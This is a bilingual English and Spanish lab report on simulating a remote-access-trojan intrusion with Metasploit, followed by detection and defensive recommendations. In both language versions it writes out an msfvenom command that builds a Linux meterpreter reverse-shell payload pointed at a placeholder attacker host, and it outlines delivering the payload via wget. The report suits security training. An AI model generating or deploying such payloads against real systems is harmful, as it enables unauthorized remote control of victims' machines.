
# Metasploit Remote Access Trojan (RAT) Session Lab

## Objective

To simulate a RAT-based intrusion using Metasploit, initiate a reverse shell connection from a Linux target, and analyze the session activity and system compromise.

## Tools Used

- Kali Linux (attacker)
- Ubuntu 22.04 (victim)
- msfvenom (payload generation)
- msfconsole (session handling)
- tcpdump (traffic analysis)
- htop (system monitoring)

## Procedure

1. Payload Creation:
   The ELF binary for reverse shell was created using msfvenom:

   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf > rat.elf

2. File Hosting and Delivery:
   - Hosted via python3 HTTP server on the attacker's machine.
   - Downloaded on the victim using wget.
   - Payload executed with proper permissions.

3. Session Establishment:
   - Listener was configured in msfconsole.
   - Upon execution, a meterpreter session was opened.
   - Commands such as sysinfo, ps, getuid, and shell were used to interact with the system.

4. Process Monitoring:
   - `htop` was run on the victim to observe the RAT process in real time.
   - PID and CPU usage confirmed the background activity of meterpreter.

5. Traffic Inspection:
   - tcpdump was used on the attacker side to monitor port 4444.
   - Reverse TCP handshake and session packets were captured.

## Results

- Successful RAT execution from ELF binary.
- Full control over the victim system established.
- Meterpreter activity observed in `htop`.
- Unencrypted communication between host and target captured via tcpdump.

## Conclusions

- Linux systems without EDR or strict execution policies are vulnerable to payload-based attacks.
- Meterpreter allows full interactive control over compromised systems.
- Real-time process monitors and traffic inspection tools are effective in detecting unauthorized activity.

## Recommendations

- Implement application whitelisting and system integrity monitoring.
- Disable outbound connections to known C2 ports (e.g., 4444).
- Configure firewalls to block unexpected reverse traffic.
- Train SOC analysts to detect meterpreter-like behaviors.

# Laboratorio de Sesión RAT con Metasploit

## Objetivo

Simular una intrusión basada en RAT utilizando Metasploit, iniciar una conexión de shell inversa desde una máquina Linux víctima y analizar la actividad de la sesión y la posible compromisión del sistema.

## Herramientas Utilizadas

- Kali Linux (atacante)
- Ubuntu 22.04 (víctima)
- msfvenom (generación del payload)
- msfconsole (manejo de sesiones)
- tcpdump (análisis de tráfico)
- htop (monitoreo de procesos)

## Procedimiento

1. Creación del payload:
   Se generó un binario ELF con shell inverso usando:

   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf > rat.elf

2. Entrega del archivo:
   - Alojado mediante HTTP server de Python.
   - Descargado en la máquina víctima con wget.
   - Ejecutado tras asignar permisos de ejecución.

3. Establecimiento de sesión:
   - Listener configurado en msfconsole.
   - Al ejecutar el payload, se abrió una sesión meterpreter.
   - Se usaron comandos como sysinfo, ps, getuid y shell para interactuar con el sistema.

4. Monitoreo de procesos:
   - Se ejecutó `htop` en la víctima para observar el proceso de RAT en tiempo real.
   - Se verificó el uso de CPU y el PID correspondiente.

5. Inspección del tráfico:
   - Se utilizó tcpdump en el atacante para observar la actividad del puerto 4444.
   - Se capturaron los paquetes de conexión inversa y comunicación de la sesión.

## Resultados

- Ejecución exitosa del binario RAT.
- Control completo de la máquina víctima.
- Actividad de meterpreter visible en `htop`.
- Tráfico sin cifrar capturado con tcpdump.

## Conclusiones

- Sistemas Linux sin herramientas EDR o políticas de ejecución estrictas son vulnerables a este tipo de ataques.
- Meterpreter permite un control total del sistema comprometido.
- Herramientas de monitoreo de procesos y análisis de red son útiles para detectar actividad no autorizada.

## Recomendaciones

- Implementar listas blancas de ejecución y monitoreo de integridad del sistema.
- Bloquear conexiones salientes a puertos de C2 conocidos (como 4444).
- Configurar firewalls para impedir tráfico inverso inesperado.
- Capacitar a analistas SOC en detección de patrones asociados a meterpreter.
